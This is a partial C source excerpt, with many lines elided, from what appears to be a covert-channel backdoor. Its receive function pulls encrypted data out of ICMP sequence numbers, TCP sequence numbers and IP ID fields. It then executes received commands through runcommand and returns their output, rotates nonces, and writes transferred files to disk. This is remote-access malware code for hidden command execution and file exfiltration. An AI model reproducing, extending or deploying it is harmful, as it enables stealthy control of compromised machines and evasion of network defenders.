...
int receivedata(int mode)
{
	...
	if ((icmp->un.echo.sequence == ntohs(0x01)
		...
		if(((thispackettime - lastpackettime) > 60) || (receivemode != IPPROTO_ICMP)) {
	...
	lastpackettime = thispackettime;
		...
		if (receivemode == IPPROTO_ICMP) {
		    dataoffset = ((0x10000) * superblock) + (ntohs(icmp->un.echo.sequence) - marker);
			if(ntohs(icmp->un.echo.sequence) == (0xffff)) {
				superblock++;
			}
		} else if (receivemode == IPPROTO_TCP) {
		    dataoffset = ntohl(tcp->seq) - (ntohl(marker) + 1);		}
		payload = ntohs(ip->id);
		...
		if (dataoffset == (SIGNEDBLOCKSIZE - 1)) { //we know we have a block when we hit the blocksize
			...
			memset(plaintext, 0x00, BLOCKSIZE);
			if(decrypt(inbuf, SIGNEDBLOCKSIZE, pk_theirs, sk_mine, nonce, plaintext) == 0 ) {
				if(decrypt(inbuf, SIGNEDBLOCKSIZE, pk_theirs, sk_mine, fakenonce, plaintext) > 0) {
					firstblock = (struct blockhdr *) plaintext;
					if(firstblock->code != CODETOKEN) {
			...
			dataexpected = SIGNEDBLOCKSIZE * countblocks(ntohl(firstblock->size));
			if(dataexpected > INPUTBUFLEN) {			// make inbuf bigger or smaller
				inbuf = realloc(inbuf, dataexpected);
				if(inbuf == NULL) {
					perror("can't allocate memory\n");
					exit(1);
				}
			plaintextblockdata =
			    (uint8_t *) realloc(plaintextblockdata, (SIGNEDBLOCKSIZE *
					       countblocks(ntohl
							   (firstblock->size)) + 32));
			if (plaintextblockdata == NULL) {
			    perror("can't allocate memory");
		    ...
		    howmuchdata = (currentblock + 1) * payloadsize;
			...
			for(i = 0; i < countblocks(ntohl(firstblock->size)); i++) {
				decrypt(inbuf + (i * SIGNEDBLOCKSIZE), SIGNEDBLOCKSIZE, pk_theirs, sk_mine, nonce, plaintextblockdata + (i * BLOCKSIZE));
			}	
			...
			sendoutput = ~(firstblock->code & 0x80) << 7;

			switch (mode) {
			case CMDRECEIVE:
			    if ((cmdcode) == CODEEXEC) {
				blockdata =
				    extractblockdata(plaintextblockdata,
						     ntohl
						     (firstblock->size));
				if ((sendoutput) && (silent != 1)) {
				    cmdoutput =
					(uint8_t *) runcommand((char *)
							       blockdata,
							       1);
				} else {
				    cmdoutput =
				...
				makeblock(CODERESPONSE,
					  (uint8_t *)fakenonce,
					  crypto_box_NONCEBYTES);  // send them the new nonce
			...
			case CMDEXEC:
				...
				extractblockdata(plaintextblockdata,
						 ntohl(firstblock->size));
			    fwrite(cmdoutput, ntohl(firstblock->size), 1,
				   stdout);
			    free(cmdoutput);
			    free(packet);
			    return (0);
			...
			case CMDTOKEN:
				...
				extractblockdata(plaintextblockdata,
						 ntohl(firstblock->size));
			memcpy(nonce, cmdoutput, crypto_box_NONCEBYTES); 
			    free(cmdoutput);
			    free(packet);
			    return (0);
			    break;
			...
			case CMDGET:
				...
				extractblockdata(plaintextblockdata,
						 ntohl(firstblock->size));
			    if (firstblock->code == CODEERROR) {
				printf("File not available\n");
			    } else {
				fd = fopen(getfilename, "w+");
				if (fd == NULL) {
				    printf("can't open %s for writing\n",
					   getfilename);
				} else {
				    fwrite(cmdoutput,
					   ntohl(firstblock->size), 1, fd);
				    fclose(fd);
				}
